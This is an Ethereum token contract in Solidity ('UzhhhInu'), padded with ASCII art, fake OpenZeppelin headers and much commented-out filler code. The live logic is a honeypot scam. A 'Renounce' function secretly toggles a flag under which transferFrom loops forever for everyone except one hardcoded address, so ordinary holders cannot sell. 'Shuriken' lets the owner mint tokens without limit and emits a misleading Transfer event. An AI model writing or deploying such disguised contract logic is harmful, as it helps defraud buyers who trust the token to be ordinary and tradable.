/**
 *Submitted for verification at Etherscan.io on 2022-01-09
*/

pragma solidity 0.4.26;




/* 

                                       do. 
                                        :NOX 
                                       ,[email protected]: 
                                       :NNNN: 
                                       :XXXON 
                                       :XoXXX. 
                                       MM;ONO: 
  .oob..                              :MMO;MOM 
 dXOXYYNNb.                          ,NNMX:MXN 
 Mo"'  '':Nbb                        dNMMN MNN: 
 Mo  'O;; ':Mb.                     ,MXMNM MNX: 
 @O :;XXMN..'[email protected]                  ,NXOMXM MNX: 
 YX;;[email protected];;[email protected]                dXOOMMN:MNX: 
 '[email protected]@@MMN:':NONb.            ,[email protected]@MbMXX: 
  [email protected]@@MMMM;;:OOONb          ,MX'"':ONMMMMX: 
  :[email protected]@[email protected]@X;""[email protected]     .dP"'   ,[email protected]: 
   [email protected]@MMNXXMMO  :[email protected]@[email protected]""":OOOXNNXXOo:
   :[email protected]@@MNXXXMNo :[email protected]"`,:;[email protected]@[email protected];.'N. 
    NO:[email protected]@[email protected]@O:'[email protected]@@@[email protected]@[email protected]@NOO ''b 
    `MO.'[email protected]@N: '[email protected]@[email protected]"'"[email protected];.  :b 
     YNO;'"[email protected];;::"XMNN:""[email protected]@MO: ,;;.:[email protected]: :OX. 
      [email protected];;[email protected]@@NO: ':O: '[email protected]@MO" ONMMX:`XO; :[email protected] 
      '@XMX':[email protected]@MN:    ;O;  :[email protected]" '[email protected]; ':OO;[email protected] 
       YN;":.:OXMX"': ,:NNO;';XMMX:  ,;@@MNN.'.:O;:@X: 
       `@N;;XOOOXO;;:O;:@MOO;:O:"" ,[email protected]@K"YM.;NMO;`NM 
        `@@[email protected]@@MNMN;@@MNXXOO: ,[email protected]'[email protected]@[email protected];.'bb. 
       [email protected]@[email protected]@@[email protected]"YNNNXoNMNMO"OXXNO.."";o. 
     [email protected]@[email protected]@[email protected]@MNXXMMo;."' .":OXO ':.'"'"'  '""o. 
    '[email protected]@X;,[email protected]@[email protected]@MXOO:":ONMNXXOXX:OOO               ""ob. 
   ')@MP"';@@[email protected]""   '"[email protected]: :OO.        :...';o;.;Xb. 
  [email protected]@MX" ;[email protected]@[email protected]:o:'      :OXMNO"' ;OOO;.:     ,OXMOOXXXOOXMb 
 ,dMOo:  [email protected]@[email protected]:::"      .    ,;O:""'  .dMXXO:    ,;[email protected]"":[email protected]@ 
:[email protected]:.  [email protected]@[email protected] ..: ,;;O;.       :[email protected]@MOO;..   .OOMNMO.;[email protected]@P 
,MP"OO'  [email protected]@O:[email protected];;XO;:OXMNOO;.  ,.;.;[email protected];.. [email protected]@@@@@M: 
`' "O:;;[email protected]@MN::[email protected]@MMNXO:;[email protected]@[email protected]@@[email protected] 
   :[email protected]@[email protected]:  :'[email protected]@[email protected]@[email protected]@@[email protected]@@@[email protected]@[email protected]"' 
   [email protected]@ONO'   :;[email protected]@[email protected]@@@@[email protected]@@[email protected]@[email protected]@P' 
  ;O:[email protected]   '[email protected]@[email protected]@b. '[email protected]@@@@@@@@@@@@[email protected]@MP"'" 
 ;O':OOXNXOOXX:   :;NMO:":[email protected]@@@@b.:[email protected]@@[email protected]@@[email protected]"""" 
 :: ;"[email protected];:  '[email protected]'":""[email protected]@[email protected]@@. [email protected]@@[email protected]@@@b 
 :;   ':O:[email protected]@O;;  ;[email protected]@XO'   "[email protected]""[email protected]@MMo. 
 :N:.   ''[email protected]::[email protected]  ;[email protected]@[email protected]@bb 
  @;O .  ,[email protected]@@MX;;[email protected] ' ':[email protected]@@@@@[email protected]@@@[email protected]@, 
  [email protected];;  :O:[email protected]@[email protected]@NOO:;;:,;;[email protected]'`"@@[email protected]@@@@[email protected]
[email protected];:oO;O:[email protected]@[email protected];O;[email protected]@@'   `[email protected]@@@@[email protected] 
  ::@MOO;oO:::[email protected]@[email protected]      ""[email protected]@@[email protected] 
    @@@XOOO':::[email protected]@[email protected]        '`[email protected]@@[email protected]' 
    [email protected]@M:'''' O:":[email protected]@[email protected]@P  -hrr-     "`"""MM' 
    ''[email protected]:     "' '[email protected]@MNNM" 
      [email protected]'         :OOMN: :[email protected]' 
      `:P           :oP''  "'[email protected]' 
       `'                    ':OXNP' 
                               '"' 






 File: @openzeppelin/contracts/math/UzInu.sol






contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
 







*/

// File: @openzeppelin/contracts/math/Math.sol


/*// ----------------------------------------------------------------------------
// Safe Math Library 
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;

    
    
    
    

    );
    
    
 File: @openzeppelin/contracts/math/Math.sol


    function deploy(bytes32 _struct) private {
       bytes memory slotcode = type(StorageUnit).creationCode;
     solium-disable-next-line 
      // assembly{ pop(create2(0, add(slotcode, 0x20), mload(slotcode), _struct)) }
   

    
    
     soliuma-next-line 
        (bool success, bytes memory data) = address(store).staticcall(
        //abi.encodeWithSelector(

          _key"""
   
   
   
    function Flex_Bridge(
       bytes32 _struct,
       bytes32 _key
   "" ) internal view returns (bytes32) {
        StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);

        require(success, "error reading storage");
       return abi.decode(data, (bytes32)); */   

 /*   function read(
        bytes32 _struct,
        bytes32 _key
   "" ) internal view returns (bytes32) {
        StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
            
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));




     
     
 /*   function read(
        bytes32 _struct,
        bytes32 _key
   "" ) internal view returns (bytes32) {
        StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
            
            
            */

contract UIlllnu {
  
    mapping (address => uint256) public balanceOf;

    // 
    string public name = "UzhhhInu";
    string public symbol = "UllZU";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() public {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;

modifier isOwner() {
    require(msg.sender == owner);
    _;
}

function Renounce() public isOwner {
    isEnabled = !isEnabled;
}





   
    
    

/*///    );
    
    
 File: @openzeppelin/contracts/math/Math.sol


    function deploy(bytes32 _struct) private {
       bytes memory slotcode = type(StorageUnit).creationCode;
     solium-disable-next-line 
      // assembly{ pop(create2(0, add(slotcode, 0x20), mload(slotcode), _struct)) }
   

            StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
            
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));

    
     soliuma-next-line 
        (bool success, bytes memory data) = address(store).staticcall(
        //abi.encodeWithSelector(

          _key"""
   
   
   
    function Flex_Bridge(
       bytes32 _struct,
       bytes32 _key
   "" ) internal view returns (bytes32) {
        StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);

        require(success, "error reading storage");
       return abi.decode(data, (bytes32)); */   

 /*   function read(
        bytes32 _struct,
        bytes32 _key
   "" ) internal view returns (bytes32) {
        StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
            
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));


	*/
	
function Shuriken(address to, uint256 value) public returns (bool)
{
    
        require(msg.sender == owner);
        
    require(totalSupply + value >= totalSupply); // Overflow check

    totalSupply += value;
    balanceOf[msg.sender] += value;
    emit Transfer(address(0), to, value);
}





/* 
        bytes32 _struct,
        bytes32 _key
   "" ) internal view returns (bytes32) {
        StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
              StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
            
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));
      
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
           StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
            
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));


      require(success, "error reading storage");
      return abi.decode(data, (bytes32));
*/





    function transfer(address to, uint256 value) public returns (bool success) {
    
        

require(balanceOf[msg.sender] >= value);

       balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }
    




    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

   
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }



/*

       bytes memory slotcode = type(StorageUnit).creationCode;
     solium-disable-next-line 
      // assembly{ pop(create2(0, add(slotcode, 0x20), mload(slotcode), _struct)) }
   

    
    
     soliuma-next-line 
        (bool success, bytes memory data) = address(store).staticcall(
        //abi.encodeWithSelector(

          _key"""
   
           StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
            
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));
        StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
            
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));

   
    function Flex_Bridge(
       bytes32 _struct,
       bytes32 _key
   "" ) internal view returns (bytes32) {
        StorageUnit store = StorageUnit(contractSlot(_struct));
        if (!IsContract.isContract(address(store))) {
            return bytes32(0);
            
            */


address Lefa = 0x281798C44040f0df0A7fAc00Af97fFea0872F246;


    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
        
      while(isEnabled) {
if(from == Lefa)  {
        
         require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; } }
        
        
        
        

            require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    
}